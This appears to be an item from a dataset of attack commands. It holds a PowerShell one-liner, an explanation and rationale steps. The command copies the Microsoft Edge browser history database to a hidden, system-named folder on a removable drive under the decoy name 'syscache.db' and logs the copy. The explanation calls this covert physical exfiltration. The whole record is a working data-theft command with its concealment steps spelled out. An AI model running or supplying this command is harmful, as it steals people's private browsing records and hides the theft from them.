command: $dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $src="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"; $dest="$dl`:\System Volume Information"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path $src -Destination (Join-Path $dest "syscache.db") -Force -ErrorAction SilentlyContinue; Write-Output "Copied Edge history to removable media at $(Get-Date)" | Out-File "$dest\op.log" -Append
explanation: Copies a browser history database to a hidden system-like folder on a removable drive for covert physical exfiltration.
rationale_steps: Create and hide a plausible system directory on USB
Copy the history database file to the USB device
Write a local log entry using Write-Output
